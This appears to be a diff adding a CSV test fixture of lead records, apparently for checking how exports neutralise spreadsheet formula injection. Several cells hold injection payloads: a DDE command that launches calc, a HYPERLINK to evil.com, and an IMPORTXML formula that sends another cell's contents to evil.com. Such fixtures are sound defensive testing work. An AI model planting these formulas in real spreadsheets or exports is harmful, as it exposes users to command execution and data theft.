@@ -1,0 +1,6 @@
+id,name,email,phone,status,source,createdAt
+1,'=CMD|'/C calc'!A0,admin@example.com,555-0001,new,website,2026-03-09T10:00:00Z
+2,'+1+1,user@evil.com,'@SUM(A1:A10),contacted,"'=HYPERLINK(""http://evil.com"")",2026-03-09T11:00:00Z
+3,John Doe,john@example.com,555-0123,converted,referral,2026-03-09T12:00:00Z
+4,'-1+1,test@test.com,'	=1+1,lost,'=malicious,2026-03-09T13:00:00Z
+5,"'=IMPORTXML(CONCAT(""http://evil.com/?v="",A2), ""//a"")",attacker@evil.com,555-0666,new,chat,2026-03-09T14:00:00Z
